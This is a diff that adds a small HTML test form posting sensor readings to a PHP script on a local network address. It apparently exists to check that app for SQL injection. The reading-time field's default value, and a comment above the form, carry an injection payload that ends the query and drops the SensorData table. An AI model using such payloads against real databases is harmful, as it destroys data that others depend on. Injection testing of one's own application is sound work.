@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SQL Injection Test Form</title>
+</head>
+<body>
+  <h2>Send POST Data to PHP (SQL Injection Test)</h2>
+
+  <!-- Example SQL Injection: abc'); DROP TABLE SensorData; -- -->
+
+  <form action="http://192.168.0.102/pp/p.php" method="POST">
+    <label>Sensor:</label><br>
+    <input type="text" name="sensor" value="abc"><br><br>
+
+    <label>Location:</label><br>
+    <input type="text" name="location" value="Office"><br><br>
+
+    <label>Value1:</label><br>
+    <input type="text" name="value1" value="10"><br><br>
+
+    <label>Value2:</label><br>
+    <input type="text" name="value2" value="20"><br><br>
+
+    <label>Value3:</label><br>
+    <input type="text" name="value3" value="30"><br><br>
+
+    <label>Reading Time:</label><br>
+    <input type="text" name="reading_time" value="2025-05-15 12:00:00'); DROP TABLE SensorData; --"><br><br>
+
+    <input type="submit" value="Submit">
+  </form>
+
+</body>
+</html>
+
